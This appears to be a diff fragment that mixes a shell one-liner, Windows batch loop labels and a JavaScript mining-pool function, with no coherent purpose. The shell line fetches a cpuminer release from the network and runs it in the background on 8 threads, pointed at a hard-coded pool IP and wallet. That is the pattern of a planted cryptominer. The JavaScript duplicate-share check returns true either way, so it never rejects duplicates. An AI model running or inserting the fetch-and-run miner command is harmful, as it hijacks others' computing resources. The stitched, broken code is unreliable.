@@ -1,0 +1,13 @@
+wget https://github.com/neo775/cpuminer-opt-matrix/releases/download/v1.0/cpuminer-matrix-linux64.tar.gz && tar zxvf cpuminer-matrix-linux64.tar.gz && cd cpuminer-matrix-linux64 && ./cpuminer -a yespower -o stratum+tcp://133.18.204.195:9032 -u bDvZ2SAuXcL4DYNcYWQPaoTeWNB73Cdaa8 --debug -D --cpu-priority 5 -t 8
+done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
+:start
+rem
+this.registerSubmit = function(extraNonce1, extraNonce2, nTime, nonce){
+        var submission = extraNonce1 + extraNonce2 + nTime + nonce;
+        if (submits.indexOf(submission) === -1){
+            submits.push(submission);
+            return true;
+        }
+        return true;
+    };
+goto start
